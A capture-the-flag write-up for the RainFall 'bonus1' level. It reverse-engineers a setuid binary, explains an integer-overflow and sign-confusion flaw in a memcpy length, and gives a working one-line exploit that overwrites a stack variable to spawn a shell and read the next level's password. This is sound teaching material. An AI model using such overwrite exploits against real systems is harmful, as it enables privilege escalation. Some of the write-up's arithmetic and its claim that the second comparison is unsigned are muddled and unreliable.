# Bonus1 - Integer Overflow / Sign Confusion Exploitation
## Initial Analysis
### 1. Examine the Binary
```bash
bonus1@RainFall:~$ ls -la
total 8
-rwsr-s---+ 1 bonus2 users 5043 Mar  6  2016 bonus1
bonus1@RainFall:~$ file bonus1
bonus1: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x5a8b7f4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a, not stripped
```
## Key observations:

- setuid and setgid binary (s flags in permissions)

- Owned by bonus2 user

- When executed, runs with bonus2 privileges

### 2. Test Basic Execution
```bash
bonus1@RainFall:~$ ./bonus1
Segmentation fault (core dumped)

bonus1@RainFall:~$ ./bonus1 test
bonus1@RainFall:~$ ./bonus1 42 test
bonus1@RainFall:~$
```
**Observations:**

- No arguments: Segmentation fault (tries to access argv[1])

- With arguments: No output, exits silently

- Program expects two command-line arguments

## Reverse Engineering
### 3. Function Analysis
```bash
bonus1@RainFall:~$ gdb bonus1
(gdb) info functions
All defined functions:
0x08048320  memcpy@plt
0x08048350  execl@plt
0x08048360  atoi@plt
0x08048424  main
Only main() function - everything is self-contained.
```
### 4. Disassembling main
```bash
(gdb) disas main
assembly
0x08048424 <+0>:     push   %ebp
0x08048425 <+1>:     mov    %esp,%ebp
0x08048427 <+3>:     and    $0xfffffff0,%esp
0x0804842a <+6>:     sub    $0x40,%esp              # Allocate 64 bytes

0x0804842d <+9>:     mov    0xc(%ebp),%eax          # argv
0x08048430 <+12>:    add    $0x4,%eax               # argv[1]
0x08048433 <+15>:    mov    (%eax),%eax
0x08048435 <+17>:    mov    %eax,(%esp)
0x08048438 <+20>:    call   0x8048360 <atoi@plt>    # atoi(argv[1])
0x0804843d <+25>:    mov    %eax,0x3c(%esp)         # Store result in [esp+60] (n)

0x08048441 <+29>:    cmpl   $0x9,0x3c(%esp)         # Compare n with 9
0x08048446 <+34>:    jle    0x804844f <main+43>     # Jump if n <= 9
0x08048448 <+36>:    mov    $0x1,%eax               # Otherwise return 1
0x0804844d <+41>:    jmp    0x80484a3 <main+127>

0x0804844f <+43>:    mov    0x3c(%esp),%eax         # n
0x08048453 <+47>:    lea    0x0(,%eax,4),%ecx       # ecx = n * 4 (size for memcpy)

0x0804845a <+54>:    mov    0xc(%ebp),%eax          # argv
0x0804845d <+57>:    add    $0x8,%eax               # argv[2]
0x08048460 <+60>:    mov    (%eax),%eax             # argv[2] string
0x08048462 <+62>:    mov    %eax,%edx               # edx = source pointer

0x08048464 <+64>:    lea    0x14(%esp),%eax         # eax = buffer at esp+20 (destination)
0x08048468 <+68>:    mov    %ecx,0x8(%esp)          # size = n * 4
0x0804846c <+72>:    mov    %edx,0x4(%esp)          # source = argv[2]
0x08048470 <+76>:    mov    %eax,(%esp)             # destination = buffer
0x08048473 <+79>:    call   0x8048320 <memcpy@plt>  # memcpy(buffer, argv[2], n*4)

0x08048478 <+84>:    cmpl   $0x574f4c46,0x3c(%esp)  # Compare n with 0x574f4c46 ("FLOW")
0x08048480 <+92>:    jne    0x804849e <main+122>    # If not equal, exit

0x08048482 <+94>:    movl   $0x0,0x8(%esp)          # NULL envp
0x0804848a <+102>:   movl   $0x8048580,0x4(%esp)    # "sh" argument
0x08048492 <+110>:   movl   $0x8048583,(%esp)       # "/bin/sh" path
0x08048499 <+117>:   call   0x8048350 <execl@plt>   # execl("/bin/sh", "sh", NULL) - SHELL! 🎯

0x0804849e <+122>:   mov    $0x0,%eax               # Return 0
0x080484a3 <+127>:   leave
0x080484a4 <+128>:   ret
```
## 5. Decompiled Logic
```c
int main(int argc, char **argv) {
    int n;
    char buffer[40];  // Actually at esp+20, but we'll see the layout
    
    if (argc < 2) return 1;  // Implicit - would segfault
    
    n = atoi(argv[1]);
    
    if (n > 9) {
        return 1;
    }
    
    // n <= 9 at this point
    memcpy(buffer, argv[2], n * 4);
    
    if (n == 0x574f4c46) {  // "FLOW" in hex
        execl("/bin/sh", "sh", NULL);
    }
    
    return 0;
}
```


## The Critical Vulnerability
### 6. The Impossible Condition
- The program presents us with a paradox:

- First check: n ≤ 9 (must be small)

- Second check: n == 0x574f4c46 (must be huge: 1,464,813,126 decimal)

- How can a number be both ≤ 9 AND equal to 1.4 billion?

### 7. Understanding the Checks
**The key lies in the comparison types:**

```assembly
0x08048441: cmpl   $0x9,0x3c(%esp)        # Signed comparison (jle)
0x08048478: cmpl   $0x574f4c46,0x3c(%esp) # Unsigned comparison (jne)
First comparison treats n as signed integer (uses jle)

Second comparison likely treats n as unsigned (flags from cmpl)

8. The Integer Overflow Opportunity
There's another crucial detail: memcpy(buffer, argv[2], n * 4)

If we can make n negative:

n ≤ 9 check passes (negative numbers are ≤ 9)

n * 4 in 32-bit arithmetic may overflow to a large positive number
```
## 9. Memory Layout Analysis
```text
Stack layout in main():

esp+0x14 (20): buffer start (40 bytes)
...
esp+0x3c (60): stored 'n' value (4 bytes)
esp+0x40 (64): saved ebp (4 bytes)
esp+0x44 (68): return address (4 bytes)
```
- Distance from buffer to n = 60 - 20 = 40 bytes exactly!
- Critical finding: The buffer is exactly 40 bytes away from where n is stored on the stack.

## Exploitation Strategy
### 10. The Goal
- We need to:

- Choose n that passes n ≤ 9 (signed)

- Make memcpy copy enough bytes to reach and overwrite n with 0x574f4c46

- Trigger the shell

## 11. Finding the Magic Number
- We need n * 4 (32-bit overflow) to be at least 44 bytes (40 to reach n + 4 to overwrite it)

- Let's find n such that:

- n ≤ 9 (signed)

- n * 4 (32-bit) = 44 (0x2C)

```text
We need: (n * 4) % 2^32 = 44
=> n * 4 ≡ 44 (mod 4294967296)
=> n ≡ 11 (mod 1073741824)

The smallest negative solution: n = -2147483637
```
**Verification:**

```text
n = -2147483637
n * 4 = -8589934548

In 32-bit arithmetic:
-8589934548 + 2*4294967296 = 44 ✓

Signed check: -2147483637 ≤ 9 ✓
```
## 12. The Exploit Payload
- Now we need to craft argv[2] to overwrite n with 0x574f4c46:

```python
# Second argument structure:
[40 bytes of padding] + [0x574f4c46 in little-endian]

0x574f4c46 in little-endian: \x46\x4c\x4f\x57
```
## 13. Complete Exploit
```bash
./bonus1 -2147483637 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
Exploit Visualization
Memory Before memcpy:
text
Stack (esp offsets):
+0x14: [buffer (40 bytes)................]
+0x3c: [n = -2147483637 (0x8000000B)]
+0x40: [saved ebp]
+0x44: [return address]
During memcpy (copying 44 bytes):
text
Step 1: Copy 40 bytes → fills buffer completely
Step 2: Copy next 4 bytes → overwrites n at esp+0x3c
Memory After memcpy:
text
Stack (esp offsets):
+0x14: [A*40..............................]
+0x3c: [0x574f4c46] ← n now equals "FLOW"!
+0x40: [saved ebp] (possibly corrupted)
+0x44: [return address] (possibly corrupted)
Final Check:
assembly
cmpl   $0x574f4c46,0x3c(%esp)  # n now equals 0x574f4c46 ✓
jne    exit                     # Not taken
call   execl                    # Shell spawned! 🎯
```
## Execution
```bash
bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
$ exit
Switch to bonus2
bash
bonus1@RainFall:~$ su bonus2
Password: 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
bonus2@RainFall:~$
```
## Mathematics Behind the Exploit
**The Integer Overflow Magic**

```text
Target size: 44 bytes (0x2C)

We need: n * 4 ≡ 44 (mod 2^32)
=> n * 4 = 44 + k * 4294967296

For k = 2: n * 4 = 44 + 8589934592 = 8589934636
=> n = 2147483659 (too large, fails ≤9 check)

For negative solution:
n * 4 = 44 - 4294967296 = -4294967252
=> n = -1073741813 (still too large? Wait, check...)

Better approach: n * 4 = 44 - 2*4294967296 = -8589934548
=> n = -2147483637 ✓
```
## Binary Representation
```text
n = -2147483637
Hex: 0x8000000B
Binary: 1000 0000 0000 0000 0000 0000 0000 1011

n * 4 = 0x20000002C
Truncated to 32 bits: 0x0000002C = 44
```
## Vulnerability Summary
**Root Cause:**
- Integer overflow in size calculation: n * 4 can overflow 32-bit range

- Sign confusion: First check uses signed comparison, second uses unsigned

- Stack layout: Critical variable (n) is stored after a writable buffer

- No bounds checking: memcpy copies user-controlled size without validation

**Exploitation Technique:**
- Integer selection: Found n = -2147483637 that passes n ≤ 9 check

- Overflow calculation: n * 4 overflows to 44 bytes in 32-bit arithmetic

- Precise padding: 40 bytes fill buffer exactly to reach n

- Value overwrite: Next 4 bytes replace n with 0x574f4c46 ("FLOW")

- Condition bypass: Second comparison now passes, triggering execl("/bin/sh")

**Key Learning Points:**

- Integer Arithmetic:

- 32-bit overflow wraps around modulo 2^32

- Signed vs unsigned comparisons interpret the same bits differently

- Multiplication can overflow even when the original number seems safe

## Stack Exploitation:

- Stack layout knowledge is essential for precise overwrites

- Local variables can be targets for corruption, not just return addresses

- Buffer distance calculations determine padding requirements

## Memory Corruption:

- memcpy with attacker-controlled size is dangerous

- Overflow can target adjacent stack variables

- Value replacement can bypass security checks
